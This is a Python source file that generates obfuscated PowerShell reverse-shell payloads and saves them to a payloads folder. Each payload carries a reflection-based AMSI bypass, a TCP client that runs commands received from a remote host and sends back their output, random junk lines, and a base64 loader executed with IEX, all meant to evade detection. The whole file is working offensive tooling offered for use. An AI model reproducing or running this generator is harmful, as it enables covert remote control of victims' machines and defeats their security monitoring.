import random
import string
import os
import base64
from datetime import datetime

def rand_name(length=None):
    length = length or random.randint(8, 14)
    return ''.join(random.choices(string.ascii_letters, k=length))

def split_string(s):
    return '+'.join([f"'{c}'" for c in s])

def junk_code():
    j = [
        f"${rand_name()} = {random.randint(1,100)}",
        f"# {rand_name()}_{random.randint(1000,9999)}",
        f"$null = {random.randint(0,1)}",
        f"${rand_name()} = '{rand_name(3)}'",
        f"# {rand_name(4)}"
    ]
    return random.choice(j) + "\n"

def amsi_bypass_reflection(var):
    return (
        f"${var['amsi_type']} = {split_string('AMSI')}\n"
        f"${var['amsi_field']} = [Ref].Assembly.GetType({split_string('System.Management.Automation.')}"
        f"+${var['amsi_type']}+{split_string('Utils')})\n"
        f"${var['amsi_failed']} = ${{{var['amsi_field']}}}.GetField(${{{var['amsi_type']}}}+{split_string('InitFailed')},'NonPublic,Static')\n"
        f"${var['amsi_failed']}.SetValue($null,$true)\n"
    )

def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
    # Assign *all* needed variables here
    var = {k: rand_name() for k in [
        "amsi_type", "amsi_field", "amsi_failed", "tcpclient", "stream", "bytes", "i", "data", "sendback",
        "sendback2", "sendbyte"
    ]}
    amsi_bypass = amsi_bypass_reflection(var)

    # Fully explicit core shell: EVERY variable comes from var
    core_shell = (
        junk_code() +
        f"${var['tcpclient']} = New-Object {split_string('System.Net.Sockets.TCPClient')} '{host}',{port}\n"
        f"${var['stream']} = ${{{var['tcpclient']}}}.GetStream()\n" +
        f"${var['bytes']} = 0..65535|%{{0}}\n" +
        f"while((${{var['i']}} = ${{{var['stream']}}}.Read(${{{var['bytes']}}},0,${{{var['bytes']}}}.Length)) -ne 0){{\n" +
        f"    ${{var['data']}} = (New-Object -TypeName {split_string('System.Text.ASCIIEncoding')}).GetString(${{{var['bytes']}}},0,${{{var['i']}}})\n" +
        f"    ${{var['sendback']}} = (iex ${{{var['data']}}} 2>&1 | Out-String)\n" +
        f"    ${{var['sendback2']}} = ${{{var['sendback']}}} + \"PS \" + (pwd).Path + \"> \"\n" +
        f"    ${{var['sendbyte']}} = ([text.encoding]::ASCII).GetBytes(${{{var['sendback2']}}})\n" +
        f"    ${{{var['stream']}}}.Write(${{{var['sendbyte']}}},0,${{{var['sendbyte']}}}.Length)\n" +
        f"    ${{{var['stream']}}}.Flush()\n" +
        "}\n" +
        junk_code()
    )

    # Loader: base64 always, never obfuscate the loader variable!
    core_shell_bytes = core_shell.encode('utf-8')
    core_shell_b64 = base64.b64encode(core_shell_bytes).decode()
    loader_var = rand_name()
    loader = (
        amsi_bypass +
        junk_code() +
        f"${loader_var} = '{core_shell_b64}'\n" +
        junk_code() +
        f"IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${loader_var})))\n"
    )
    ps = loader

    if write_file:
        folder = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'server', 'payloads'))
        os.makedirs(folder, exist_ok=True)
        filename = f"ps_payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.ps1"
        path = os.path.join(folder, filename)
        with open(path, 'w', encoding='utf-8') as f:
            f.write(ps)
        return filename
    else:
        return ps

generate_polymorphic_ps = generate_obfuscated_ps
